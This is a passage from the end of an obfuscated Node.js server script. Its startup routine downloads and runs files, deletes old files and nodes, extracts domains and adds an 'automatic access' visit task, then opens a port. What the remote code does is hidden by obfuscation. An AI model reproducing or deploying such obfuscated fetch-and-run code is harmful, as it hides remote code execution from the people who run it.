console[_0x3efd8b(0x19b)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2aed4c;}catch(_0x1090ee){return console[_0x3efd8b(0x22b)](_0x3efd8b(0x19e)+_0x1090ee[_0x3efd8b(0x187)]),null;}}async function startserver(){const _0x5ef992=_0x2b3be8;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x336e03){console[_0x5ef992(0x22b)](_0x5ef992(0x17c),_0x336e03);}}startserver()[_0x2b3be8(0x1c8)](_0x115a20=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x115a20);}),app[_0x2b3be8(0x1ef)](PORT,()=>console[_0x2b3be8(0x19b)](_0x2b3be8(0x20d)+PORT+'!'));
